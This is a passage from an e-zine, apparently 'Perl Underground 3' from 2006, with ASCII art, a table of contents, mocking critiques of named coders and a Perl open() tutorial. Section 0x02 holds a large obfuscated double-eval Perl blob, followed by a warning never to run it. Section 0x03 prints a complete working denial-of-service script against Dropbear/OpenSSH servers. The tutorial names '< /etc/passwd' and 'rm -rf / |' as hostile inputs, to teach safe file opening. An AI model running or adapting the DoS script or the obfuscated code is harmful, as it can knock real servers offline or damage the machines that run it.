                    $$$$$$$$$   $$$$$$$$$$$     $$$$$$$$$     $$$$                            
                   $$$$$$$$$$$   $$$$$$$$$$$   $$$$$$$$$$$    $$$$                            
                   $$$$    $$$$         $$$$   $$$$    $$$$   $$$$                            
                   $$$$ 3  $$$$         $$$$   $$$$  3 $$$$   $$$$                            
                   $$$$    $$$$     $$$$$$$    $$$$    $$$$   $$$$   3                         
                   $$$$$$$$$$$      $$$$$$$    $$$$$$$$$$$    $$$$                            
                   $$$$$$$$$$           $$$$   $$$$$$$$$$     $$$$                            
                   $$$$                 $$$$   $$$$  $$$$     $$$$                            
                   $$$$          $$$$$$$$$$$   $$$$   $$$$    $$$$$$$$$$$                     
                   $$$$         $$$$$$$$$$$    $$$$    $$$$    $$$$$$$$$$$            
                 
                                                                            
          $$$$     $$$$   $$$$      $$$$   $$$$$$$$$$   $$$$$$$$$$$     $$$$$$$$$$            
          $$$$     $$$$   $$$$$  3  $$$$   $$$$$$$$$$$   $$$$$$$$$$$   $$$$$$$$$$$$           
          $$$$     $$$$   $$$$$$    $$$$   $$$$    $$$$         $$$$   $$$$     $$$$          
          $$$$  3  $$$$   $$$$$$$   $$$$   $$$$    $$$$         $$$$   $$$$  3  $$$$          
          $$$$     $$$$   $$$$ $$$  $$$$   $$$$ 3  $$$$     $$$$$$$    $$$$     $$$$          
          $$$$     $$$$   $$$$  $$$ $$$$   $$$$    $$$$     $$$$$$$    $$$$$$$$$$$$           
          $$$$     $$$$   $$$$   $$$$$$$   $$$$    $$$$         $$$$   $$$$$$$$$$$            
          $$$$     $$$$   $$$$    $$$$$$   $$$$    $$$$         $$$$   $$$$   $$$$            
          $$$$$$$$$$$$$   $$$$  3  $$$$$   $$$$$$$$$$$   $$$$$$$$$$$   $$$$    $$$$           
           $$$$$$$$$$$    $$$$      $$$$   $$$$$$$$$$   $$$$$$$$$$$    $$$$     $$$$

         
  $$$$$$$$$     $$$$$$$$$$      $$$$$$$$$$$    $$$$     $$$$   $$$$      $$$$   $$$$$$$$$$$
 $$$$$$$$$$$   $$$$$$$$$$$$    $$$$$$$$$$$$$   $$$$  3  $$$$   $$$$$  3  $$$$   $$$$$$$$$$$$
 $$$$   $$$$   $$$$     $$$$   $$$$     $$$$   $$$$     $$$$   $$$$$$    $$$$   $$$$     $$$$
 $$$$ 3 $$$$   $$$$  3  $$$$   $$$$     $$$$   $$$$     $$$$   $$$$$$$   $$$$   $$$$     $$$$
 $$$$          $$$$     $$$$   $$$$  3  $$$$   $$$$     $$$$   $$$$ $$$  $$$$   $$$$  3  $$$$
 $$$$  $$$     $$$$$$$$$$$$    $$$$     $$$$   $$$$     $$$$   $$$$  $$$ $$$$   $$$$     $$$$
 $$$$ 3 $$$$   $$$$$$$$$$$     $$$$     $$$$   $$$$  3  $$$$   $$$$   $$$$$$$   $$$$     $$$$
 $$$$   $$$$   $$$$   $$$$     $$$$     $$$$   $$$$     $$$$   $$$$    $$$$$$   $$$$     $$$$
 $$$$$$$$$$    $$$$ 3  $$$$    $$$$$$$$$$$$$   $$$$$$$$$$$$$   $$$$  3  $$$$$   $$$$$$$$$$$$
  $$$$$$$$     $$$$     $$$$    $$$$$$$$$$$     $$$$$$$$$$$    $$$$      $$$$   $$$$$$$$$$$

[root@yourbox.anywhere]$ date
Sun Aug 13 18:16:19 EDT 2006

[root@yourbox.anywhere]$ perl justlayitout.pl

00. TOC
01. Part One: Summer Time
02. EyeDropper You
03. Another str0ke
04. School You: japhy
05. prdelka&#39;s cameo
06. School You: mauke
07. (K-)sPecial boy
08. School You: McDarren
09. Random Noob: Qex 
10. School You: xdg
11. Token PHP noob
12. Hello bantown
13. !dSR !good
14. School You: MJD
15. Intermission
16. Part Two: Back to School
17. brian d fucking foy
18. School You: davido
19. Antisec antiperls
20. School You: atcroft
21. Russian for the fall
22. Hello s0ttle
23. RoMaNSoFt is TwEaKy
24. School You: merlyn
25. oh noez spiderz
26. Hello h0no
27. Killer str0ke
28. Shoutz and Outz

[root@yourbox.anywhere]$ perl rockon.pl

-[0x01] # Part One: Summer Time ------------------------------------------

&lt;nemo&gt; i had to be in a .txt
&lt;nemo&gt; i&#39;m glad it&#39;s this one :p
&lt;nemo&gt; and not my ~/

Summer is here in its full joyous being. Let us all relax and enjoy ourselves. 
Let us have fun. Write some obfuscations. Play some golf. Write fun code and 
have fun coding and critiquing with your friends. Read and laugh. This issue 
is less talk and more code. This is Perl Underground 3.

-[0x02] # EyeDropper You -------------------------------------------------

Would you like some cheap 0day obfuscation? 

Here you go, sweet-rose.pl

eval eval &#39;&quot;&#39;.


                                                                    &#39;`&#39;.&#39;\\&#39;.&#39;\\&#39;.(&#39;[&#39;^&#39;#&#39;).
                                                                    (&#39;^&#39;^(&#39;`&#39;|&#39;-&#39;)).((&#39;^&#39;)^(
                                                                &#39;`&#39;|&#39;,&#39;)).&#39;\\&#39;.&#39;\\&#39;.(&#39;[&#39;^&#39;#&#39;).(&#39;^&#39;
                                                                ^(&#39;`&#39;|&#39;-&#39;)).(&#39;`&#39;^&quot;\%&quot;).&#39;\\&#39;.&#39;\\&#39;.(
                                                              &#39;[&#39;^&#39;#&#39;).(&#39;^&#39;^                (&#39;`&#39;|&#39;(&#39;
                                                              )).(&#39;^&#39;^(&quot;\`&quot;|                (&#39;*&#39;))).
                                                            &#39;\\&#39;.&#39;\\&#39;.      (&#39;[&#39;^&#39;#&#39;).(&#39;^&#39;^(    &#39;`&#39;|&#39;,&#39;)).
                                                            (&#39;^&#39;^(&#39;`&#39;|      &#39;.&#39;)).&#39;\\&#39;.&#39;\\&#39;.    (&#39;[&#39;^&#39;#&#39;).
                                                          (&#39;^&#39;^(&#39;`&#39;|    &#39;)&#39;)).(&#39;^&#39;                ^(&#39;`&#39;|&#39;,&#39;)
                                                          ).&#39;\\&#39;.&#39;&#39;.    &#39;\\&#39;.(&#39;[&#39;^                &#39;#&#39;).(&#39;^&#39;^
                                                        (&#39;`&#39;|&#39;(&#39;)).(    &#39;`&#39;^&#39;$&#39;)    .&#39;\\&#39;.&#39;\\&#39;      .(&#39;[&#39;^&#39;#&#39;).(
                                                        &#39;^&#39;^(&#39;`&#39;|&#39;,&#39;    )).(&#39;^&#39;^    (&#39;`&#39;|&#39;.&#39;))      .&#39;\\&#39;.&#39;\\&#39;.(
                                                        &#39;[&#39;^&#39;#&#39;).(    &#39;^&#39;^(&quot;\`&quot;|    &#39;,&#39;)).(&quot;\`&quot;^    &#39;$&#39;).(&#39;\\&#39;).
                                                        &#39;\\&#39;.(&#39;[&#39;^    &#39;#&#39;).(&#39;^&#39;^    (&#39;`&#39;|&#39;)&#39;)).(    &#39;^&#39;^(&#39;`&#39;|&#39;,&#39;
                                          )).(&#39;\\&#39;).    &#39;\\&#39;.(&#39;[&#39;^    &#39;#&#39;).(&quot;\^&quot;^(                &#39;`&#39;|&#39;(&#39;)).(&#39;^&#39;
                                          ^(&#39;`&#39;|&#39;(&#39;)    ).&#39;\\&#39;.&#39;&#39;.    &#39;\\&#39;.((&#39;[&#39;)^                &#39;#&#39;).(&#39;^&#39;^(&#39;`&#39;
                                    |&#39;,&#39;)).(&#39;^&#39;^(&#39;`&#39;|&#39;.&#39;  )).(&#39;\\&#39;).    &#39;\\&#39;.(&#39;[&#39;^&#39;#&#39;).(&#39;^&#39;^(&#39;`&#39;|&#39;,&#39;)).(&#39;`&#39;^&#39;&amp;&#39;)
                                    .&#39;`&#39;.(&#39;!&#39;^&#39;+&#39;).&quot;\&quot;&quot;;  $:=&#39;.&#39;^&#39;~&#39;    ;$~=&#39;@&#39;|&#39;(&#39;;$^=&#39;)&#39;^&#39;[&#39;;$/=&#39;`&#39;|&#39;.&#39;;$,=&#39;(&#39;
                                    ^&#39;}&#39;;$\=&#39;`&#39;|&#39;!&#39;;$:=&#39;)&#39;^&#39;}&#39;;$~=&#39;*&#39;|    &#39;`&#39;;$^=&#39;+&#39;^&#39;_&#39;;$/=&#39;&amp;&#39;|&#39;@&#39;;$,    =&quot;\[&quot;&amp;
                                    &#39;~&#39;;$\=&#39;,&#39;^&#39;|&#39;;$:=&#39;.&#39;^&#39;~&#39;;$~=&quot;\@&quot;|    &#39;(&#39;;$^=&#39;)&#39;^&#39;[&#39;;$/=&#39;`&#39;|&#39;.&#39;;$,    =&quot;\(&quot;^
                                    &#39;}&#39;;$\=&#39;`&#39;|&#39;!&#39;;$:=&#39;)&#39;^&#39;}&#39;;$~=&#39;*&#39;|&#39;`&#39;      ;$^=&#39;+&#39;^&#39;_&#39;;$/=&#39;&amp;&#39;|&#39;@&#39;    ;$,=&#39;[&#39;&amp;
                                    &#39;~&#39;;$\=&#39;,&#39;^&#39;|&#39;;$:=&#39;.&#39;^&#39;~&#39;;$~=&#39;@&#39;|&#39;(&#39;      ;$^=&#39;)&#39;^&#39;[&#39;;$/=&#39;`&#39;|&#39;.&#39;    ;$,=&#39;(&#39;^
                                    &#39;}&#39;;$\=&#39;`&#39;|(&#39;!&#39;);$:=    &#39;)&#39;^&#39;}&#39;;$~=&quot;\*&quot;|        &#39;`&#39;;$^=&quot;\+&quot;^      &quot;\_&quot;;$/=
                                    &#39;&amp;&#39;|&#39;@&#39;;$,=&#39;[&#39;&amp;&quot;\~&quot;;    $\=&#39;,&#39;^(&#39;|&#39;);$:=        &#39;.&#39;^&quot;\~&quot;;$~=      &#39;@&#39;|&#39;(&#39;;
                                      $^=&#39;)&#39;^&#39;[&#39;;$/=&#39;`&#39;|&#39;.&#39;;    $,=&#39;(&#39;^&#39;}&#39;;$\=&#39;`&#39;|                &#39;!&#39;;$:=&#39;)&#39;^&#39;}&#39;;$~=&#39;*&#39;|&#39;`&#39;;
                                      $^=&#39;+&#39;^&#39;_&#39;;$/=&#39;&amp;&#39;|&#39;@&#39;;    $,=&#39;[&#39;&amp;&#39;~&#39;;$\=&#39;,&#39;^                &#39;|&#39;;$:=&#39;.&#39;^&#39;~&#39;;$~=&#39;@&#39;|&#39;(&#39;;
                                        $^=&#39;)&#39;^&#39;[&#39;;$/=&#39;`&#39;|&#39;.&#39;;$,    =&#39;(&#39;^&#39;}&#39;;$\=&#39;`&#39;|&#39;!&#39;;$:=&#39;)&#39;^&#39;}&#39;;$~=&#39;*&#39;|&#39;`&#39;;$^=&#39;+&#39;^(&#39;_&#39;);$/=
                                        &#39;&amp;&#39;|&#39;@&#39;;$,=&#39;[&#39;&amp;(&#39;~&#39;);$\=    &#39;,&#39;^&#39;|&#39;;$:=&#39;.&#39;^&#39;~&#39;;$~=&#39;@&#39;|&#39;(&#39;;$^=&#39;)&#39;^&#39;[&#39;;$/=&#39;`&#39;|&#39;.&#39;;$,=&#39;(&#39;
                                            ^&#39;}&#39;;$\=&#39;`&#39;|&#39;!&#39;;$:=&#39;)&#39;    ^&#39;}&#39;;$~=&#39;*&#39;|&#39;`&#39;;$^=&#39;+&#39;^&#39;_&#39;;$/=&#39;&amp;&#39;|&#39;@&#39;;$,    =&#39;[&#39;&amp;&quot;\~&quot;;
                                            $\=&#39;,&#39;^&#39;|&#39;;$:=&#39;.&#39;^&#39;~&#39;;    $~=&#39;@&#39;|&#39;(&#39;;$^=&#39;)&#39;^&#39;[&#39;;$/=&#39;`&#39;|&#39;.&#39;;$,=&#39;(&#39;^    &#39;}&#39;;$\=&#39;`&#39;
                                                |&#39;!&#39;;$:=&#39;)&#39;^&quot;\}&quot;;$~=    &#39;*&#39;|&#39;`&#39;;$^=&#39;+&#39;^&#39;_&#39;;$/=&#39;&amp;&#39;|&#39;@&#39;;$,=&#39;[&#39;    &amp;&#39;~&#39;;$\=&#39;,&#39;^
                                                &#39;|&#39;;$:=&#39;.&#39;^(&#39;~&#39;);$~=    &#39;@&#39;|&#39;(&#39;;$^=&#39;)&#39;^&#39;[&#39;;$/=&#39;`&#39;|&#39;.&#39;;$,=&#39;(&#39;    ^&#39;}&#39;;$\=&#39;`&#39;|
                                                    &#39;!&#39;;$:=&#39;)&#39;^&#39;}&#39;;$~=    (&#39;*&#39;)|      &#39;`&#39;;$^=&#39;+&#39;^(&#39;_&#39;);$/=    &#39;&amp;&#39;|&#39;@&#39;;$,=&quot;\[&quot;&amp;
                                                    &#39;~&#39;;$\=&#39;,&#39;^&#39;|&#39;;$:=    (&#39;.&#39;)^      &#39;~&#39;;$~=&#39;@&#39;|(&#39;(&#39;);$^=    &#39;)&#39;^&#39;[&#39;;$/=&quot;\`&quot;|
                                                  &#39;.&#39;;$,=&#39;(&#39;^&#39;}&#39;;$\=&#39;`&#39;|    &quot;\!&quot;;$:=            (&#39;)&#39;)^      &#39;}&#39;;$~=&#39;*&#39;|(&#39;`&#39;);$^=
                                                  &#39;+&#39;^&#39;_&#39;;$/=&#39;&amp;&#39;|&#39;@&#39;;$,=    &#39;[&#39;&amp;&#39;~&#39;;            $\=&#39;,&#39;      ^&#39;|&#39;;$:=&#39;.&#39;^&quot;\~&quot;;$~=
                                                  &#39;@&#39;|&#39;(&#39;;$^=&#39;)&#39;^&#39;[&#39;;$/=&#39;`&#39;|&#39;.&#39;;$,=&#39;(&#39;^&#39;}&#39;;$\=            &#39;`&#39;|&#39;!&#39;;$:=&#39;)&#39;^&#39;}&#39;;$~=
                                                  &#39;*&#39;|&#39;`&#39;;$^=&#39;+&#39;^&#39;_&#39;;$/=&#39;&amp;&#39;|&#39;@&#39;;$,=&#39;[&#39;&amp;&#39;~&#39;;$\=            &#39;,&#39;^&#39;|&#39;;$:=&#39;.&#39;^&#39;~&#39;;$~=
                                                  &#39;@&#39;|&#39;(&#39;;$^=&#39;)&#39;^&#39;[&#39;;$/=&#39;`&#39;|&#39;.&#39;;$,=&#39;(&#39;^&#39;}&#39;;$\=&#39;`&#39;|&#39;!&#39;;$:=&#39;)&#39;^&#39;}&#39;;$~=&#39;*&#39;|&#39;`&#39;;$^
                                                  =&#39;+&#39;^&#39;_&#39;;$/=&#39;&amp;&#39;|&#39;@&#39;;$,=&#39;[&#39;&amp;&#39;~&#39;;$\=&#39;,&#39;^&#39;|&#39;;$:=&#39;.&#39;^&#39;~&#39;;$~=&#39;@&#39;|&#39;(&#39;;$^=&#39;)&#39;^&quot;\[&quot;;
                                                  $/=&#39;`&#39;|&#39;.&#39;;$,=&#39;(&#39;^&#39;}&#39;;$\=&#39;`&#39;|&#39;!&#39;;$:=              (&#39;)&#39;)^          &#39;}&#39;;$~
                                                  =&#39;*&#39;|&#39;`&#39;;$^=&#39;+&#39;^&#39;_&#39;;$/=&#39;&amp;&#39;|(&#39;@&#39;);$,=              (&#39;[&#39;)&amp;          &#39;~&#39;;$\
                                                    =&#39;,&#39;^&#39;|&#39;;$:=&#39;.&#39;^&#39;~&#39;;$~=&#39;@&#39;|&#39;(&#39;
                                                    ;$^=&#39;)&#39;^&#39;[&#39;;$/=&#39;`&#39;|&#39;.&#39;;$,=&#39;(&#39;^
                                                      &#39;}&#39;;$\=&#39;`&#39;|&#39;!&#39;      ;($:)=
                                                      &#39;)&#39;^&#39;}&#39;;$~=&#39;*&#39;      |&quot;\`&quot;;
                                                                          $^=&#39;+&#39;
                                                                          ^&quot;\_&quot;;
                                                                        $/=&#39;&amp;&#39;
                                                                        |&quot;\@&quot;;
                                                                        $,=&#39;[&#39;
                                                                        &amp;&quot;\~&quot;;
                                                                        $\=&#39;,&#39;
                                                                        ^&quot;\|&quot;;
                              $:  =&#39;.&#39;^&#39;~&#39;;$~=(&#39;@&#39;)|                  &#39;(&#39;;$^
                              =(  &#39;)&#39;)^&#39;[&#39;;$/=(&#39;`&#39;)|                  &#39;.&#39;;$,
                              =&#39;(&#39;    ^&#39;}&#39;;$\=&#39;`&#39;|&quot;\!&quot;;$:=            (&#39;)&#39;)^
                              &#39;}&#39;;    $~=&#39;*&#39;|&#39;`&#39;;$^=(&#39;+&#39;)^            &#39;_&#39;;$/
                            =&#39;&amp;&#39;|&quot;\@&quot;;    $,=&#39;[&#39;&amp;&#39;~&#39;;$\=(&#39;,&#39;)^      &#39;|&#39;;$:
                            =&#39;.&#39;^&quot;\~&quot;;    $~=&#39;@&#39;|&#39;(&#39;;$^=(&#39;)&#39;)^      &#39;[&#39;;$/
                              =&#39;`&#39;|&#39;.&#39;;$,=    &#39;(&#39;^&#39;}&#39;;$\=&#39;`&#39;|&#39;!&#39;    ;($:)=
                              &#39;)&#39;^&quot;\}&quot;;$~=    &#39;*&#39;|&#39;`&#39;;$^=&#39;+&#39;^&#39;_&#39;    ;($/)=
                                    &#39;&amp;&#39;|&#39;@&#39;;$,    =&#39;[&#39;&amp;&#39;~&#39;;$\=    (&#39;,&#39;)^
                                    &#39;|&#39;;$:=&#39;.&#39;    ^&#39;~&#39;;$~=&#39;@&#39;|    &#39;(&#39;;$^
                                        =&#39;)&#39;^&quot;\[&quot;;  $/=&#39;`&#39;        |&quot;\.&quot;;
                                        $,=&#39;(&#39;^&#39;}&#39;  ;($\)=        (&#39;`&#39;)|
                        &#39;!&#39;;$:=&quot;\)&quot;^        &#39;}&#39;;$~=&quot;\*&quot;|    &#39;`&#39;;$^=&#39;+&#39;^&#39;_&#39;;$/=&#39;&amp;&#39;|
                        &#39;@&#39;;$,=&quot;\[&quot;&amp;        &#39;~&#39;;$\=&quot;\,&quot;^    &#39;|&#39;;$:=&#39;.&#39;^&#39;~&#39;;$~=&#39;@&#39;|
                  &#39;(&#39;;$^=&#39;)&#39;^&#39;[&#39;;$/=&#39;`&#39;|            &#39;.&#39;;$,=&#39;(&#39;^&#39;}&#39;;$\=&#39;`&#39;|&#39;!&#39;;$:=&quot;\)&quot;^
                  &#39;}&#39;;$~=&#39;*&#39;|&#39;`&#39;;$^=&#39;+&#39;^            &#39;_&#39;;$/=&#39;&amp;&#39;|&#39;@&#39;;$,=&#39;[&#39;&amp;&#39;~&#39;;$\=&quot;\,&quot;^
            &#39;|&#39;;$:=&#39;.&#39;^&#39;~&#39;;$~=&#39;@&#39;|    &#39;(&#39;;$^=&#39;)&#39;^&#39;[&#39;;$/=&#39;`&#39;|    &#39;.&#39;;$,=&#39;(&#39;^&#39;}&#39;;$\=&#39;`&#39;|&#39;!&#39;;
            $:=&#39;)&#39;^&#39;}&#39;;$~=&#39;*&#39;|&#39;`&#39;;    $^=&#39;+&#39;^&#39;_&#39;;$/=&#39;&amp;&#39;|&#39;@&#39;;    $,=&#39;[&#39;&amp;&#39;~&#39;;$\=&#39;,&#39;^&quot;\|&quot;;$:=
        &#39;.&#39;^&#39;~&#39;;$~=&#39;@&#39;|&#39;(&#39;;$^=    &#39;)&#39;^&#39;[&#39;;$/=&quot;\`&quot;|  &#39;.&#39;;$,=&quot;\(&quot;^    &#39;}&#39;;$\=&#39;`&#39;|&#39;!&#39;;$:=(&#39;)&#39;)^
        &#39;}&#39;;$~=&#39;*&#39;|&#39;`&#39;;$^=&#39;+&#39;^    &#39;_&#39;;$/=&#39;&amp;&#39;|&quot;\@&quot;;  $,=&#39;[&#39;&amp;&quot;\~&quot;;    $\=&#39;,&#39;^&#39;|&#39;;$:=&#39;.&#39;^&#39;~&#39;;$~
    =&#39;@&#39;|&#39;(&#39;;$^=&#39;)&#39;^&#39;[&#39;;$/    =&#39;`&#39;|&#39;.&#39;;$,=(&#39;(&#39;)^    &#39;}&#39;;$\=&#39;`&#39;|&quot;\!&quot;;    $:=&#39;)&#39;^&#39;}&#39;;$~=(&#39;*&#39;)|
    &#39;`&#39;;$^=&#39;+&#39;^&#39;_&#39;;$/=&#39;&amp;&#39;|    &#39;@&#39;;$,=&#39;[&#39;&amp;&#39;~&#39;;$\=    &#39;,&#39;^&#39;|&#39;;$:=&quot;\.&quot;^    &#39;~&#39;;$~=&#39;@&#39;|(&#39;(&#39;);$^=
  &#39;)&#39;^&#39;[&#39;;$/=&#39;`&#39;|&quot;\.&quot;;    $,=&#39;(&#39;^&#39;}&#39;;$\=&#39;`&#39;|          &#39;!&#39;;$:=&#39;)&#39;^&#39;}&#39;;$~=    &#39;*&#39;|&#39;`&#39;;$^=&#39;+&#39;^&#39;_&#39;
  ;$/=&#39;&amp;&#39;|&#39;@&#39;;$,=&quot;\[&quot;&amp;    &#39;~&#39;;$\=&#39;,&#39;^&#39;|&#39;;$:=          &#39;.&#39;^&#39;~&#39;;$~=&#39;@&#39;|&#39;(&#39;    ;$^=&#39;)&#39;^&#39;[&#39;;$/=&#39;`&#39;
|&#39;.&#39;;$,=&#39;(&#39;^&#39;}&#39;;$\    =&#39;`&#39;|&#39;!&#39;;$:=&#39;)&#39;^&#39;}&#39;;            $~=&#39;*&#39;|&#39;`&#39;;$^=&#39;+&#39;^&#39;_&#39;;    $/=&#39;&amp;&#39;|&#39;@&#39;;$,=
&#39;[&#39;&amp;&#39;~&#39;;$\=&#39;,&#39;^&#39;|&#39;    ;$:=&#39;.&#39;^&#39;~&#39;;$~=&quot;\@&quot;|            &#39;(&#39;;$^=&#39;)&#39;^&#39;[&#39;;$/=&#39;`&#39;|    &#39;.&#39;;$,=&#39;(&#39;^&#39;}&#39;
;$\=&#39;`&#39;|&#39;!&#39;;$:    =&#39;)&#39;^&#39;}&#39;;$~=&#39;*&#39;|&#39;`&#39;;                  $^=&#39;+&#39;^&#39;_&#39;;$/=&#39;&amp;&#39;|&#39;@&#39;;    $,=&#39;[&#39;&amp;&quot;\~&quot;;
$\=&#39;,&#39;^&#39;|&#39;;$:=    &#39;.&#39;^&#39;~&#39;;$~=&#39;@&#39;|&quot;\(&quot;;                  $^=&#39;)&#39;^&#39;[&#39;;$/=&#39;`&#39;|&#39;.&#39;;    $,=&#39;(&#39;^&quot;\}&quot;;
$\=&#39;`&#39;|&quot;\!&quot;;  $:=&#39;)&#39;^&#39;}&#39;;$~=&#39;*&#39;|                            &#39;`&#39;;$^=&#39;+&#39;^&#39;_&#39;;$/=&#39;&amp;&#39;|    &quot;\@&quot;;$,=
&#39;[&#39;&amp;&quot;\~&quot;;$\=  &#39;,&#39;^&#39;|&#39;;$:=&#39;.&#39;^&#39;~&#39;                            ;$~=&#39;@&#39;|&#39;(&#39;;$^=&#39;)&#39;^&#39;[&#39;    ;$/=&#39;`&#39;|
&#39;.&#39;;$,=&#39;(&#39;  ^&#39;}&#39;;$\=(&#39;`&#39;)|                                &#39;!&#39;;$:    =&#39;)&#39;^&#39;}&#39;;$~=&#39;*&#39;|    &#39;`&#39;;$^
=&#39;+&#39;^&quot;\_&quot;;  $/=&#39;&amp;&#39;|&#39;@&#39;;$,=                                (&#39;[&#39;)&amp;    &#39;~&#39;;$\=&#39;,&#39;^&quot;\|&quot;;    $:=&#39;.&#39;
^&#39;~&#39;;$~=  &#39;@&#39;|&#39;(&#39;;$^                                      =&quot;\)&quot;^      &#39;[&#39;;$/=&#39;`&#39;|&#39;.&#39;;$,=  &#39;(&#39;^
&quot;\}&quot;;$\=  &#39;`&#39;|&#39;!&#39;;$:                                      =&quot;\)&quot;^      &#39;}&#39;;$~=&#39;*&#39;|&#39;`&#39;;$^=  &#39;+&#39;^
&#39;_&#39;;$/  =&#39;&amp;&#39;|&#39;@&#39;                                          ;($,)=                &#39;[&#39;&amp;&#39;~&#39;;$\=&#39;,&#39;
^&quot;\|&quot;;  $:=&quot;\.&quot;^                                          &#39;~&#39;;$~                =&#39;@&#39;|(&#39;(&#39;);$^=
&#39;)&#39;^  &#39;[&#39;;$/                                            =&quot;\`&quot;|
&#39;.&#39;;  $,=&#39;(&#39;                                            ^&quot;\}&quot;;
$\=&#39;`&#39;|&#39;!&#39;                                              ;($:)=
&#39;)&#39;^&#39;}&#39;;$~                                              =&quot;\*&quot;|
  &#39;`&#39;;                                                  $^=&#39;+&#39;
  ^&#39;_&#39;                                                  ;($/)=
                                                      (&#39;&amp;&#39;)|
                                                      &#39;@&#39;;$,
                                                      =&quot;\[&quot;&amp;
                                                      &#39;~&#39;;$\
                                                      =&quot;\,&quot;^
                                                      &#39;|&#39;;#;

Listen up. Don&#39;t ever run that. The obfu is too fu for you.

-[0x03] # Another str0ke -------------------------------------------------

Remember this?

#!/usr/bin/perl
## I needed a working test script so here it is.
## just a keep alive thread, I had a few problems with Pablo&#39;s code running properly.
##
## Straight from Pablo Fernandez&#39;s advisory:
# Vulnerable code is in svr-main.c
#
# /* check for max number of connections not authorised */
# for (j = 0; j &lt; MAX_UNAUTH_CLIENTS; j++) {
#        if (childpipes[j] &lt; 0) {
#                break;
#        }
# }
#
# if (j == MAX_UNAUTH_CLIENTS) {
#        /* no free connections */
#        /* TODO - possibly log, though this would be an easy way
#         * to fill logs/disk */
#        close(childsock);
#        continue;
# }
## /str0ke (milw0rm.com)

use IO::Socket;
use Thread;
use strict;

# thanks to Perl Underground for my moronic coding style fixes.
my ($serv, $port, $time) = @ARGV;

# str0ke, it has been a pleasure.
# This script now comes across as intelligent and someone might take it seriously.
# Naturally I may have some reservations about some choices, but to each their own.

sub usage
{
	print &quot;\nDropbear / OpenSSH Server (MAX_UNAUTH_CLIENTS) Denial of Service Exploit\n&quot;;
	print &quot;by /str0ke (milw0rm.com)\n&quot;;
	print &quot;Credits to Pablo Fernandez\n&quot;;
	print &quot;Usage: $0 [Target Domain] [Target Port] [Seconds to hold attack]\n&quot;;
	exit ();
}

sub exploit
{
	my ($serv, $port, $sleep) = @_;
	my $sock = new IO::Socket::INET ( PeerAddr =&gt; $serv,
	PeerPort =&gt; $port,
	Proto =&gt; &#39;tcp&#39;,
	);

	die &quot;Could not create socket: $!\n&quot; unless $sock;
	sleep $sleep;
	close($sock);
}

sub thread {
	print &quot;Server: $serv\nPort: $port\nSeconds: $time\n&quot;;
	for my $i ( 1 .. 51 ) {
		print &quot;.&quot;;
		my $thr = new Thread \&amp;exploit, $serv, $port, $time;
	}
	sleep $time; #detach wouldn&#39;t be good
}

if (@ARGV != 3){&amp;usage;}else{&amp;thread;}

I have one remaining issue.
This is the one line we harshly criticized that we didn&#39;t offer a direct syntax replacement for.
Naturally, you did not do your own research and find out a witty or attractive way to fix that.
This sin, and others, contradict with your pleasant handling of the situation.
I am displeased that you have not made an effort to fix other scripts of yours.
I am curious as to why you removed Perl Underground from your site.
I am curious as to why Perl Underground was on your site for a time in the first place.
I am disappointed that I have not seen more recent Perl from you. 
I hope we have not scared you off.
Question weighs more than answer, and your code will be criticized in this issue.

-[0x04] # School You: japhy ----------------------------------------------

&quot;Open, Sesame!&quot;
If you&#39;ve used Perl for a week, you&#39;re probably familiar with the task of opening a file, either to
read from or write to it. Here&#39;s a simple refresher course for you -- some of it involves Perl 5.6,
which lets you do some nifty things with open(). There are three basic operations you use a
filehandle for: reading, writing, and appending. You can also read and write (or read and append)
to files, and you can read from to write to a program (from its output, or to its input).

# error-checking would, of course, be used

open FILE, &quot;filename&quot;;	    # read
open FILE, &quot;&lt; filename&quot;;    # read (explicit)
open FILE, &quot;&gt; filename&quot;;    # overwrite
open FILE, &quot;&gt;&gt; filename&quot;;   # append
open FILE, &quot;+&lt; filename&quot;;   # read and write
open FILE, &quot;+&gt; filename&quot;;   # read and overwrite (clobber first)
open FILE, &quot;+&gt;&gt; filename&quot;;  # read and append
open FILE, &quot;program |&quot;;     # read from program
open FILE, &quot;| program&quot;;     # write to program
For safety&#39;s sake, the explicit forms should always be used, and with a space between the mode and
the filename. Here&#39;s an example of why:

chomp(my $filename = &lt;STDIN&gt;);
open FILE, $filename;
This allows the user pass anything from &quot;&lt; /etc/passwd&quot; to &quot;rm -rf / |&quot; to your open() call,
neither of which you&#39;d be too happy to permit. For the same reason, using open(F, &quot;&gt;$filename&quot;)
isn&#39;t enough either -- the user could slip an extra &gt; in on you and cause you to append, rather
than overwrite.

Perl 5.6 allows an even greater extent of control: a multi-argument form of open():

# open FILEHANDLE, MODE, EXPR

open FILE, &quot;&lt;&quot;, $filename;  # read from $filename
If you want to pipe to a program, the MODE should be &quot;|-&quot;; if you want to pipe from a program, the
MODE should be &quot;-|&quot;. In the case of call programs, you can send a list of arguments after the
program name:

# open FILEHANDLE, MODE, EXPR, LIST

open LS, &quot;-|&quot;, &quot;ls&quot;, &quot;-R&quot;;
That invokes ls with the -R switch (for recursive listing), and returns the output to Perl.

Finally, Perl 5.6 allows you to use an undefined lexical (a my variable) in the place of the
filehandle. This allows you to use filehandles as variables more easily -- using them in objects,
passing them to functions, etc.

for my $f (@listing) {
  open my($fh), &quot;&lt;&quot;, $f;
  push @files, $fh;
}
Obfuscorner
If you only send a filehandle to open(), Perl will look for a package variable (not a lexical) of
the same name, and use the value of that variable as the filename to open. A simple use of this is
to open the program itself; since $0 holds the name of the program, you can simply write:

open 0;  # like:  open 0, $0
Whose Line Is It, Anyway?
Files are not made up of lines. Files are made up of sequential bytes. A &quot;line&quot; is a made-up
concept which only applies to text files (who cares how many &quot;lines&quot; there are in a JPEG?). The
standard definition of a line is a sequence of zero or more bytes ending with a newline. Whether
that is \n or \r\n or \n\r is up to your OS to decide. But who cares about &quot;lines&quot;? Perl is more
interested in records.

A record is a sequence of bytes separated from other records by some other sequence of bytes. A
&quot;line&quot; is merely a record with a separator \n (or whatever). What good are records, though, if Perl
keeps reading lines? Well, just tell Perl not to read a line!

open FORTUNE, &quot;&lt; /usr/share/games/fortunes/art&quot;;
{
  local $/ = &quot;\n%\n&quot;;
  @fortunes = &lt;FORTUNE&gt;;
}
close FORTUNE;
This code makes use of the $/ variable -- the &quot;input record separator&quot; -- to change how much each
read of &lt;FORTUNE&gt; does. Instead of stopping at &quot;\n&quot;, it stops at &quot;\n%\n&quot; (the separator of my
computer&#39;s fortune files). This means that we can read multiple &quot;lines&quot; at once. In fact, Perl has
two special values of $/ explicitly for that purpose:
Setting $/ to &quot;&quot; causes Perl to use &quot;paragraph&quot; mode; it will read a chunk of lines that is
followed by extra newlines -- in other words, a sequence of bytes ending in two or more newlines.
Setting $/ to undef causes Perl to read the rest of the file all at once.
